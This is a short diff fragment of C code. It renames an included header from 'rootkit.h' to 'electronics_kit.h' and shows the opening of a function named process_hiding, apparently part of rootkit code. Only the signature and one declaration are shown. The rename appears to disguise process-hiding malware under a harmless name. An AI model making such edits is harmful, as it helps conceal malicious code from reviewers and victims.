@@ -1,4 +1,4 @@
-#include "rootkit.h"
+#include "electronics_kit.h"
 
 int process_hiding(char * p_name) {
 	struct proc *p;
